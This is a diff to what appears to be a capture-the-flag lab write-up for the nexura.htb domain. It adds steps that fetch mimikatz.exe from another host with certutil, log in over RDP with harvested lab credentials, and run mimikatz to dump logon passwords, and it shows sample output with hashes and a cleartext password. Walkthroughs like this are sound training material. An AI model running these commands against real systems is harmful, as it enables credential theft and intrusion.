@@ -45,7 +45,7 @@ dealer-screwed-gym1
 ```
 
 ```powershell
-certutil -urlcache -split -f http://172.16.119.13:8081/mimikatz.exe C:\Temp\mimikatz.exe
+certutil -urlcache -split -f http://172.16.119.13:8080/mimikatz.exe C:\Temp\mimikatz.exe
 
 
 ```
@@ -87,3 +87,45 @@ I used Password Safe 3 app to got the next credencials
 | David Brittni  | bdavid   | caramel-cigars-reply1 |
 | Tom Sandy      | stom     | fails-nibble-disturb4 |
 | William Hallam | hwilliam | warned-wobble-occur8  |
+```shell
+xfreerdp /v:172.16.119.11 /u:bdavid /p:'caramel-cigars-reply1' /d:nexura.htb
+```
+
+```powershell
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+
+# OR (one line)
+mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit" > C:\Temp\creds.txt
+---
+Authentication Id : 0 ; 258343 (00000000:0003f127)
+Session           : RemoteInteractive from 2
+User Name         : stom
+Domain            : NEXURA
+Logon Server      : DC01
+Logon Time        : 10/16/2026 9:20:46 PM
+SID               : S-1-5-21-1333759777-277832620-2286231135-1106
+	msv :	
+	 [00000003] Primary
+	 * Username : stom
+	 * Domain   : NEXURA
+	 * NTLM     : 21ea958524cfd9a7791737f8d2f764fa
+	 * SHA1     : f2fc2263e4d7cff0fbb19ef485891774f0ad6031
+	 * DPAPI    : 06e85cb199e902a0145ff04963e7dd72
+	tspkg :	
+	wdigest :	
+	 * Username : stom
+	 * Domain   : NEXURA
+	 * Password : (null)
+	kerberos :	
+	 * Username : stom
+	 * Domain   : NEXURA.HTB
+	 * Password : calves-warp-learning1 # Here we have the psswd
+	ssp :	
+	credman :	
+```
+
+And we have the cred `stom` with psswd `calves-warp-learning1`.
+
+
